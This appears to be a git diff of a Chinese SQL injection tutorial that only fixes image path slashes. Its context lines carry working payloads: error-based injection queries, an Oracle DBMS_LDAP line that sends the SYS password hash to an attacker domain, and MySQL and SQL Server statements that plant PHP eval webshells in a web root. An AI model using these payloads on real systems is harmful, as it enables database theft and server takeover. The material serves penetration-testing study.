@@ -47,7 +47,7 @@ DBMS_PIPE.RECEIVE_MESSAGE('a',5)
 select * from users where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);
 ```
 
-![](media\2019-12-31-02.png)
+![](media/2019-12-31-02.png)
 
 2、使用 extractvalue() 
 
@@ -55,7 +55,7 @@ select * from users where id=1 and (select 1 from (select count(*),concat(user()
 select * from users where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));
 ```
 
-![](media\2019-12-31-01.png)
+![](media/2019-12-31-01.png)
 
 3、使用updatexml()
 
@@ -63,7 +63,7 @@ select * from users where id=1 and (extractvalue(1,concat(0x7e,(select user()),0
 select * from users where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));
 ```
 
-![](media\2019-12-31-03.png)
+![](media/2019-12-31-03.png)
 
 **SQLServer:**
 
@@ -71,7 +71,7 @@ select * from users where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e
 
 或者使用convert(int,@@version)函数也有同样的效果
 
-![](media\2019-12-31-04.png)
+![](media/2019-12-31-04.png)
 
 **oracle数据库：**
 
@@ -126,13 +126,13 @@ SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.attac
 
 1、当secure_file_priv为空时mysql可以任意写文件，进而getshell。
 
-![](media\2019-12-31-06.png)
+![](media/2019-12-31-06.png)
 
 ```
 select '<?php eval($_POST['huahua'])?>' out_file 'C:\\phpstudy\\WWW\\evil.php'
 ```
 
-![](media\2019-12-31-07.png)
+![](media/2019-12-31-07.png)
 
 说到了mysql写文件顺便说一个另类的读文件的方法，并且在secure_file_priv=NULL时也可以使用
 
@@ -141,7 +141,7 @@ create table mytable(a varchar(100));
 LOAD DATA LOCAL INFILE "C:\\phpstudy\\WWW\\evil.php" INTO TABLE mytable;
 ```
 
-![](media\2019-12-31-08.png)
+![](media/2019-12-31-08.png)
 
 2、日志查询getshell
 
@@ -152,9 +152,9 @@ set global general_log_file = 'C:\\phpstudy\\WWW\\ma.php';   #设置日志目录
 select '<?php eval($_POST[huahua]);?>'  #写入shell
 ```
 
-![](media\2019-12-31-10.png)
+![](media/2019-12-31-10.png)
 
-![](media\2019-12-31-09.png)
+![](media/2019-12-31-09.png)
 
 3、UDF命令执行
 
@@ -204,7 +204,7 @@ insert into test(cmd) values(0x3c3f70687020706870696e666f28293b3f3e);
 backup database test2 to disk='C:\\phpstudy\\WWW\\test.php' WITH DIFFERENTIAL,FORMAT;
 ```
 
-![](media\2019-12-31-11.png)
+![](media/2019-12-31-11.png)
 
 3、sp_makewebtask(2000版本)
 
